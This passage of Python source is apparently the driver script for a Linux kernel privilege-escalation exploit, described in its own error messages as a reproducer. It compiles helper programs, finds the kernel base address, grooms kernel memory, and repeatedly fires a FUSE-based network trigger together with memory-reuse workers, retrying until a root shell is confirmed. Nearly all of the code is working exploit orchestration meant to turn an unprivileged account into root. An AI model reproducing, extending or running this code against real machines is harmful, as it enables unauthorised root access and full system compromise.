    attempt_directory: Path = work_directory / f"high-attempt-{attempt:04d}"
    mountpoint: Path = attempt_directory / "mnt"
    launcher: Path = attempt_directory / "root-shell-handoff"
    fuse_log: Path = attempt_directory / "fuse.log"
    reclaimer_log: Path = attempt_directory / "reclaimer.log"
    trigger_log: Path = attempt_directory / "trigger.log"
    registry: ProcessRegistry = ProcessRegistry()
    attempt_directory.mkdir(mode=0o700)
    mountpoint.mkdir(mode=0o700)
    clear_attempt_markers(uid, strict=True)
    copy_launcher(helpers.high_reclaimer, launcher, uid)
    try:
        fuse_process: ManagedProcess = registry.spawn(
            "network trigger",
            (
                *plan.fuse_namespace_prefix,
                sys.executable,
                str(helpers.fuse_server),
                str(mountpoint),
                "high",
                str(cpu_plan.high_fuse),
                str(cpu_plan.high_trigger),
                str(trigger_log),
                str(helpers.trigger),
            ),
            trigger_environment(
                plan, cpu_plan, geometry, "high", profile.pulse
            ),
            log_path=fuse_log,
            isolated_group=True,
        )
        wait_for_markers(
            "network trigger setup finished",
            ((FUSE_READY, True),),
            uid,
            SETUP_TIMEOUT_SECONDS,
            (fuse_process,),
        )
        reclaimer: ManagedProcess = registry.spawn(
            "memory-reuse helper",
            (
                str(helpers.high_reclaimer),
                str(geometry.target_fd),
                str(geometry.corrupt_fd),
                str(profile.reply_lead_ns),
                str(profile.worker_lead_ns),
                str(cpu_plan.orchestrator),
                str(cpu_plan.high_sender),
                str(cpu_plan.release),
                str(cpu_plan.high_worker_count),
                ",".join(str(cpu) for cpu in cpu_plan.high_workers),
            ),
            reclaimer_environment(launcher),
            log_path=reclaimer_log,
            isolated_group=False,
        )
        wait_for_markers(
            "memory-reuse workers were ready",
            ((FDTABLE_READY, True), (Path("/tmp/h083_reclaim_pid"), True)),
            uid,
            SETUP_TIMEOUT_SECONDS,
            (fuse_process, reclaimer),
        )
        create_marker(TRIGGER_START, uid)
        with parent_on_orchestrator_cpu(cpu_plan.orchestrator):
            wait_for_markers(
                "network and memory helpers synchronized",
                (
                    (Path("/tmp/h083_fuse_blocked"), False),
                    (Path("/tmp/h049_fuse_blocked"), False),
                    (Path("/tmp/h049_fuse_release"), False),
                    (Path("/tmp/h113_seed_refilled"), False),
                ),
                uid,
                SETUP_TIMEOUT_SECONDS,
                (fuse_process, reclaimer),
            )
            time.sleep(PRE_SIGNAL_SETTLE_SECONDS)
            create_marker(SIGNAL_ARMED, uid)
            with parent_ignores_terminal_interrupts():
                trigger_status: int = wait_for_trigger_status(
                    uid, fuse_process, SETUP_TIMEOUT_SECONDS
                )
                reclaimer_status: int = reclaimer.process.wait()
        if carrier.process.poll() is not None:
            fail("memory-layout helper stopped during the exploit attempt")
        summary: ReclaimSummary = parse_reclaim_summary(uid)
        if summary.root_shell:
            return AttemptResult(
                True,
                False,
                "The root shell exited normally.",
            )
        safe_retry: bool = (
            trigger_status == 0
            and summary.workers == cpu_plan.high_worker_count
            and 0 <= summary.setup_failures <= cpu_plan.high_worker_count
            and summary.fatal_failures == 0
            and reclaimer_status == (0 if summary.setup_failures == 0 else 1)
            and summary.base_delay_ns == 20_000
            and summary.spacing_ns == 0
        )
        return AttemptResult(
            False,
            safe_retry,
            f"network trigger status {trigger_status}; memory-reuse helper "
            f"status {reclaimer_status}; {summary.workers} workers, "
            f"{summary.setup_failures} setup failures, "
            f"{summary.fatal_failures} fatal failures",
        )
    finally:
        registry.stop_all()
        clear_attempt_markers(uid, strict=False)
        if attempt_directory.exists():
            try:
                shutil.rmtree(attempt_directory)
            except OSError as error:
                print(
                    f"warning: cannot clean attempt directory {attempt_directory}: {error}",
                    file=sys.stderr,
                )


def run_campaign() -> int:
    if len(sys.argv) != 1:
        fail(f"usage: {Path(sys.argv[0]).name}")
    uid: int = os.getuid()
    cpu_plan: CpuPlan = verify_runtime(uid)
    lock: RunLock = RunLock.acquire(uid)
    work_directory: Path | None = None
    carrier_registry: ProcessRegistry = ProcessRegistry()
    try:
        plan, programs = detect_platform()
        print(f"Target: {plan.label}", flush=True)
        describe_cpu_plan(cpu_plan)
        work_directory = make_work_directory(uid)
        breaker("building required helpers")
        helpers: Helpers = compile_helpers(work_directory, programs)
        breaker("discovering kernel layout")
        kernel_base: int = locate_kernel_base(helpers.locator)
        print("Kernel layout discovered.", flush=True)
        breaker("attempting root conversion")
        attempt: int = 0
        epoch: int = 0
        while True:
            epoch += 1
            print(f"Preparing memory layout {epoch}...", flush=True)
            carrier, geometry = start_carrier(
                uid,
                plan,
                programs,
                helpers.carrier,
                work_directory,
                kernel_base,
                epoch,
                cpu_plan,
                carrier_registry,
            )
            verify_fd_limit(geometry)
            print("Memory layout ready.", flush=True)
            if geometry.order < 2:
                for _carrier_attempt in range(1, SLAB_ATTEMPTS_PER_CARRIER + 1):
                    attempt += 1
                    if carrier.process.poll() is not None:
                        fail("memory-layout helper stopped before the next attempt")
                    print(f"Exploit attempt {attempt}...", flush=True)
                    result: AttemptResult = run_slab_attempt(
                        attempt,
                        uid,
                        work_directory,
                        plan,
                        cpu_plan,
                        helpers,
                        geometry,
                        carrier,
                    )
                    if result.success:
                        breaker("root access confirmed")
                        print(result.detail, flush=True)
                        return 0
                    if not result.safe_retry:
                        fail(f"exploit attempt ended unexpectedly: {result.detail}")
                    print("No root access this time; retrying safely.", flush=True)
            else:
                profiles: tuple[TimingProfile, ...] = timing_profiles(
                    plan, geometry.order
                )
                for profile in profiles:
                    attempt += 1
                    if carrier.process.poll() is not None:
                        fail("memory-layout helper stopped before the next attempt")
                    print(f"Exploit attempt {attempt}...", flush=True)
                    result = run_high_attempt(
                        attempt,
                        uid,
                        work_directory,
                        plan,
                        cpu_plan,
                        helpers,
                        geometry,
                        carrier,
                        profile,
                    )
                    if result.success:
                        breaker("root access confirmed")
                        print(result.detail, flush=True)
                        return 0
                    if not result.safe_retry:
                        fail(f"exploit attempt ended unexpectedly: {result.detail}")
                    print("No root access this time; retrying safely.", flush=True)
            carrier_registry.stop_all()
            safe_unlink(H209_READY, uid, strict=False)
    finally:
        try:
            carrier_registry.stop_all()
            safe_unlink(H209_READY, uid, strict=False)
            clear_attempt_markers(uid, strict=False)
            if work_directory is not None:
                remove_owned_tree(work_directory, uid)
        finally:
            lock.close()


def main() -> int:
    try:
        return run_campaign()
    except ChainError as error:
        print(f"Reproducer stopped: {error}", file=sys.stderr)
        return 1
    except (OSError, shutil.Error, subprocess.SubprocessError) as error:
        print(f"Reproducer stopped: {error}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("Reproducer interrupted.", file=sys.stderr)
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
